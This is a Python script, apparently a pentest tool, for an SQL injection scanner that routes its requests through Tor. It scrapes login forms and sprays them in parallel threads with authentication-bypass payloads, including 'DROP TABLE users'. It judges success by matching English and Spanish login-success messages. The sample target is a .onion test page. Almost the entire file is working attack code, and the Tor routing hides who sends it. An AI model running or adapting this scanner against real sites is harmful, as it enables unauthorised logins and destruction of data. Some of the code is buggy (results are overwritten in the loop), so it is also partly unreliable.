import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import json

class AdvancedSqlInjectionScanner:
    def __init__(self, proxy_address="127.0.0.1", proxy_port=9050):
        self.session = requests.Session()
        self.proxies = {
            'http': f'socks5h://{proxy_address}:{proxy_port}',
            'https': f'socks5h://{proxy_address}:{proxy_port}'
        }

    def get_forms(self, url):
        forms_info = []
        try:
            response = self.session.get(url, proxies=self.proxies, allow_redirects=True)
            response.raise_for_status()
            soup = BeautifulSoup(response.content, "html.parser")
            forms = soup.find_all("form")
            for form in forms:
                inputs_info = []
                inputs = form.find_all('input')
                for input_tag in inputs:
                    input_info = {}
                    nombre = input_tag.get('name')
                    if nombre:
                        input_info['name'] = nombre
                        inputs_info.append(input_info)
                forms_info.append({
                    'action': form.attrs.get("action"),
                    'inputs': inputs_info
                })
            return forms_info
        except requests.exceptions.RequestException as e:
            print(f"Error al acceder a {url}: {e}")
            return {'error': str(e)}

    def vulnerable(self, response):
        # Lista de posibles mensajes de error o éxito relacionados con SQL
        sql_related_messages = [
            # Mensajes en inglés
            "login successful!",
            "welcome",
            "access granted",
            "authentication successful",
            "you are in",
            "login confirmed",
            "successfully logged in",
            "session created successfully",
            "login successful. welcome!",
            "logged in. welcome back!",
            "login successful. enjoy your stay!",
            "access granted. proceed!",
            "authentication successful. welcome!",
            
            # Mensajes en español
            "inicio de sesión exitoso",
            "bienvenido",
            "inicio de sesión exitoso!",
            "acceso concedido",
            "autenticación exitosa",
            "estás adentro",
            "confirmación de inicio de sesión",
            "sesión iniciada con éxito",
            "sesión creada exitosamente",
            "inicio de sesión exitoso. ¡Bienvenido!",
            "logueado exitosamente. ¡Bienvenido de nuevo!",
            "inicio de sesión exitoso. ¡Disfruta tu estancia!",
            "acceso concedido. ¡Procede!",
            "autenticación exitosa. ¡Bienvenido!"
        ]

        # Verifica si alguno de los mensajes está presente en la respuesta
        for message in sql_related_messages:
            if message in response.content.decode().lower():
                return True
        return False

    def inject_sql(self, url, action, headers):
        current_url = self.session.get(url).url
        sql_payloads = [
            "' OR 1=1 -- ",
            "' OR 'a'='a",
            '" OR "a"="a',
            "') OR ('a'='a",
            '" OR "a"="a" -- ',
            "') OR ('a'='a",
            "'; DROP TABLE users; --",
            "'; SELECT * FROM users; --",
            "UNION SELECT 1,2,3 --",
            "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
            "ORDER BY 1--",
        ]

        username_payloads = [
            "usernam",
            "uname",
            "username",
            "user",
            "usr",
            "name"
        ]

        password_payloads = [
            "psw",
            "password",
            "pass",
            "pwd",
        ]

        vulnerable_forms = []
        errors = []

        def send_request(username_payload, password_payload, sql_payload):
            payload = {username_payload: sql_payload, password_payload: '1234'}

            try:
                res = self.session.post(urljoin(url, action), data=payload,
                                        headers=headers, proxies=self.proxies, allow_redirects=True)

                res.raise_for_status()

                if self.vulnerable(res) and res.url != current_url:
                    new_url = res.url
                    if current_url != new_url: # si la URL cambió, entonces es vulnerable (redirección)
                        vulnerable_forms.append({'url': new_url, 'payload': payload})
                        return

            except Exception as e:
                errors.append(str(e))

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for username_payload in username_payloads:
                for password_payload in password_payloads:
                    for sql_payload in sql_payloads:
                        futures.append(executor.submit(send_request, username_payload, password_payload, sql_payload))

            for future in as_completed(futures):
                future.result()

        return {'vulnerable_forms': vulnerable_forms, 'errors': errors}

    def sql_injection_scan(self, urls):
        results = {}
        for url in urls:
            try:
                self.session.proxies = {
                    'http': 'socks5h://localhost:9050',
                    'https': 'socks5h://localhost:9050'
                }

                forms_info = self.get_forms(url)
                print(f"[+] Detectados {len(forms_info)} formularios en {url}.")

                for form_info in forms_info:
                    action = form_info.get("action")
                    if action and (".php" in url or ".php" in action):
                        result = self.inject_sql(url, action, {'User-Agent': 'pentest'})
                        results = {'url': url, 'forms_info': forms_info, 'sql_injection_result': result}

            except Exception as e:
                print(f"Error durante el escaneo de inyección SQL para {url}: {e}")
                results = {'url': url, 'error': str(e)}

        return results

if __name__ == "__main__":
    urls = [
        "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.html"
    ]

    sql_scanner = AdvancedSqlInjectionScanner()
    results = sql_scanner.sql_injection_scan(urls)

    # Imprimir resultados en formato JSON
    print(json.dumps(results, indent=4))
